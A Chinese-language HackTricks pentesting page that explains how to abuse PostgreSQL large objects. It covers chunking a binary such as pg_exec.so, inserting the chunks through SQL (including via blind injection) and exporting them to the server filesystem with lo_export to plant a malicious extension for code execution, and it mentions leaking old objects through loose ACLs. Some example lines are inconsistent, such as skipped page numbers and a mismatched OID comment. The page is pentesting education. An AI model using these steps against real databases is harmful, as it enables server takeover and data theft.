<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# PostgreSQL大型对象

PostgreSQL提供了一种称为**大型对象（large object）**的结构，用于存储难以完整处理的数据（如图像或PDF文档）。与`COPY TO`函数相反，**大型对象**的优势在于它们所持有的**数据**可以作为**原始导入文件的完全副本**导出回**文件系统**。

为了将**完整文件保存在此表中**，您首先需要在上述表中**创建一个对象**（由**LOID**标识），然后在此对象中**插入2KB的块**。非常重要的是，所有的**块都有2KB**（除了可能的最后一个）**或者**导出到文件系统的**函数将无法工作**。

为了将您的**二进制文件**拆分为**2KB大小的块**，您可以执行以下操作：
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
为了将创建的每个文件编码为Base64或Hex，您可以使用以下方法：
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
在利用此漏洞时，请记住您必须发送**2KB明文字节的块**（而不是2KB的base64或十六进制编码字节）。如果您尝试自动化此过程，则**十六进制编码**文件的大小是**两倍**（因此您需要为每个块发送4KB的编码数据），而**base64**编码文件的大小为`ceil(n / 3) * 4`。
{% endhint %}

此外，您可以通过调试过程查看创建的大型对象的内容：
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# 使用 lo_creat 和 Base64

首先，我们需要创建一个 LOID，用于保存二进制数据：
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
如果你正在滥用**盲注**，你会更感兴趣使用`lo_create`和**固定的LOID**，这样你就**知道**你需要**上传**内容的位置。\
另外，请注意，函数的名称是`lo_creat`和`lo_create`，没有语法错误。

LOID用于在`pg_largeobject`表中标识对象。可以使用以下方法将大小为2KB的块插入到`pg_largeobject`表中：
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
最后，您可以将文件导出到文件系统中（在此示例中使用的LOID为`173454`）：
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
请注意，在最新版本的PostgreSQL中，您可能需要**上传扩展程序而不指定任何路径**。[**阅读此处获取更多信息**](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

您可能有兴趣在导出大型对象后删除它：
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# 使用 lo\_import 和 Hex

在这种情况下，将使用 lo\_import 来创建一个大型对象。幸运的是，在这种情况下，您可以（也可以）指定要使用的 LOID：
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
创建对象后，您可以开始在每个页面上插入数据（请记住，您必须插入2KB的数据块）：
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
HEX必须只包含十六进制（不包括`0x`或`\x`），例如：
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
最后，将数据导出到一个文件中并删除大对象：
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
注意，在最新版本的PostgreSQL中，您可能需要**上传扩展而不指定任何路径**。[**阅读此处获取更多信息**](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# 限制

在阅读PostgreSQL中的大对象文档后，我们可以发现**大对象可以有ACL**（访问控制列表）。可以配置**新的大对象**，使得您的用户**没有足够的权限**来读取它们，即使它们是由您的用户创建的。

然而，可能存在**具有允许当前用户读取的ACL的旧对象**，然后我们可以泄露该对象的内容。


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

- 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
